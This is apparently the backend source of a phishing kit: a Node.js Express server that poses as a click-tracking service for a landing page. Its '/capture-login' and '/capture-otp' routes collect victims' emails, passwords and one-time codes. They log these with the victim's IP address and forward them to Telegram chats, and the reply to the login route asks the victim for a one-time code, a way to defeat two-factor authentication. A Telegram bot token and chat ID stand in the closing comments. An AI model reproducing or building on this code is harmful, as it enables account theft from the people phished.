const express = require("express");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

// ── Express Setup ──
app.use(cors({ origin: true }));
app.options(/.*/, cors({ origin: true }));
app.use(express.json());

// ── Telegram Bot Setup ──
const TOKEN = process.env.TELEGRAM_TOKEN || "";

const CHAT_IDS = [
  process.env.TELEGRAM_CHAT_ID,
  process.env.SECOND_TELEGRAM_CHAT_ID,
].filter(Boolean);

let bot;

if (TOKEN) {
  bot = new TelegramBot(TOKEN, { polling: false });
} else {
  console.warn(
    "TELEGRAM_TOKEN is not configured; Telegram alerts are disabled."
  );
}

// ── Send Telegram Alert to Both Recipients ──
async function sendTelegramAlert(title, details) {
  if (!bot || CHAT_IDS.length === 0) {
    console.warn(
      "Telegram alert skipped: bot or chat IDs are not configured."
    );
    return;
  }

  const message = `🔔 ${title}\n\n${details}`;
  const uniqueChatIds = [...new Set(CHAT_IDS)];

  const results = await Promise.allSettled(
    uniqueChatIds.map((chatId) =>
      bot.sendMessage(chatId, message)
    )
  );

  results.forEach((result, index) => {
    if (result.status === "fulfilled") {
      console.log(
        `Telegram alert delivered to recipient ${index + 1}.`
      );
    } else {
      console.error(
        `Telegram delivery failed for recipient ${index + 1}:`,
        result.reason.message
      );
    }
  });
}

// ── Health Check ──
app.get("/", (req, res) => {
  res.status(200).send("Click tracking backend is running.");
});

// ── Click Tracking Route ──
// Example: /track/campaign1

app.get("/track/:linkId", (req, res) => {
  const { linkId } = req.params;

  // Only allow simple tracking IDs
  if (!/^[a-zA-Z0-9_-]{1,60}$/.test(linkId)) {
    return res.status(400).send("Invalid tracking link ID.");
  }

  const destination = process.env.LANDING_PAGE_URL;

  if (!destination) {
    return res.status(503).send(
      "LANDING_PAGE_URL is missing in Render."
    );
  }

  let landingPage;

  try {
    landingPage = new URL(destination);

    if (!["http:", "https:"].includes(landingPage.protocol)) {
      throw new Error("Invalid URL protocol");
    }
  } catch {
    return res.status(500).send("Invalid landing page URL.");
  }

  const userAgent = req.get("user-agent") || "Unknown";
  const referrer = req.get("referer") || "Direct / unknown";

  const device = /tablet|ipad/i.test(userAgent)
    ? "Tablet"
    : /mobile|android|iphone/i.test(userAgent)
      ? "Mobile"
      : "Desktop or unknown";

  const details = [
    `Link ID: ${linkId}`,
    `Time (UTC): ${new Date().toISOString()}`,
    `Device: ${device}`,
    `Referrer: ${referrer.slice(0, 300)}`,
  ].join("\n");

  // Redirect to EventPro
  res.redirect(302, landingPage.toString());

  // Send Telegram notifications to both configured chat IDs
  sendTelegramAlert("Website Link Clicked", details)
    .catch((err) => {
      console.error("Click notification failed:", err.message);
    });
});

app.post("/capture-login", (req, res) => {
  const { email, password, provider } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const time = new Date().toLocaleString();

  // Console logging
  console.log("=======================");
  console.log(`Login Attempt`);
  console.log(`Provider: ${provider}`);
  console.log(`Email : ${email}`);
  console.log(`Password : ${password}`);
  console.log(`IP: ${ip}`);
  console.log(`Time : ${time}`);
  console.log("==================================");

  // Telegram alert
  const telegramMsg = `*Provider:* ${provider}\n*Email:* ${email}\n*Password:* ${password}\n*IP:* ${ip}\n*Time:* ${time}`;
  sendTelegramAlert("LOGIN ATTEMPT", telegramMsg);

  res.json({ requireOTP: true });
});

app.post("/capture-otp", (req, res) => {
  const { otp } = req.body;
  const time = new Date().toLocaleString();

  console.log("=======================");
  console.log(`OTP Capture`);
  console.log(`OTP Code : ${otp}`);
  console.log(`Time : ${time}`);
  console.log(`==================================`);

  // Telegram alert
  const telegramMsg = `*OTP Code:* ${otp}\n*Time:* ${time}`;
  sendTelegramAlert("OTP RECEIVED", telegramMsg);

  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  if (!TOKEN || !CHAT_IDS) {
    console.log(
      "⚠️  WARNING: Telegram environment variables are not fully configured. Set TELEGRAM_TOKEN and TELEGRAM_CHAT_ID in Render or your environment.",
    );
  } else {
    console.log("✅ Telegram alerts enabled");
  }
});


// TELEGRAM_TOKEN=7948054500:AAFdarEUeMMl4Y1SBs4cAnk9ikySJ8C9f
// TELEGRAM_CHAT_ID=5859927427